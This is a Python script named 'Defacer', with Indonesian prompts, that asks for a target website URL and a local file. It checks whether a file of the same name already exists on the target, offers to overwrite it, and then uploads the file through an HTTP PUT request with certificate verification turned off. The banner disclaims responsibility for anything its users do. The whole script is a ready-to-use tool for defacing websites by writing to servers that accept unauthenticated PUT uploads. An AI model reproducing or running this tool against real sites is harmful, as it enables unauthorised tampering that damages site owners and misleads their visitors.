
"""Software yang kami buat bersifat OPEN SOURCE"""

import time, os, sys, requests, string, webbrowser 
os.system(' ')

print ("#----------------------------------------------------------------#")
print ("<|-------------------------| Defacer |--------------------------|>")
print (" | Author:             RX77E, Security Syber Team Indonean      |")
print (" | Spesial Thank's:    RX77E                                    |")
print (" | Github:             https://github.com/Sreetx                |")
print (" | Instagram:          https://www.instagram.com/memelucubikin  |")
print (" |--------------------------------------------------------------|")
print (" | Kami tidak bertanggung jawab atas apapun yang kalian lakukan |")
print ("<|--------------------------------------------------------------|>")
print ("#----------------------------------------------------------------#")
print(' [INFO] Masukan kepala url beserta awalannya agar script bekerja, contoh: https://www.target.com/ atau http://www.target.com/')

try:
    enter = input('\n [*] Tekan enter untuk melanjutkan....')
    url = input('\n [?] Masukan URL target: ')
    file = input(' [?] Masukan nama file yang akan dikirimkan: ')
    print('\n [*] Harap tunggu....')

    def script():
        with open(file, 'rb') as kirim:
          f = kirim.read()
        sc = f
        print(' [*] Nama file yang akan dikirim '+file)
        print(' [*] Proses mengupload file')
        print(' [*] Proses mengupload file berlangsung....')
        r = requests.request('put', url + file, data=sc, headers={'Content-Type': 'application/octet-stream'}, verify = False)

        if r.status_code < 200 or r.status_code >=300:
            print(' [!] Upload gagal\n');sys.exit()
        else:
            print(' [*] Proses upload berhasil')
            print(' [*] Silakan dicek')
            print(' [*] URL: '+url+file)
            tanya2 = input(' [?] Ingin membaca Readmie/Tentang? [Y/n]: ')
            if tanya2.lower() == 'y':
                print(' [*] Membuka browser....')
                webbrowser.open('https://github.com/Sreetx/defacer')
                print(' [*] Mematikan Program....')
                sys.exit()
            else:
                sys.exit()

    print(' [*] Mengecek file di '+url)
    s = requests.get(url+'/'+file, verify = False)
    if s.status_code == requests.codes.ok:
        print('\n [?] Menemukan file yang sama dengan target')
        tanya = input(' [?] Ganti file target? [Y/n]: ')
        if tanya.lower() == 'y':     
            script()
        else:
            print('\n [*] Keluar dari program....\n')
            sys.exit()
    else:
        print(' [*] Tidak ditemukan file yang sama dengan target')
        script()
  
except KeyboardInterrupt: print('\n [*] Mematikan program....\n');sys.exit()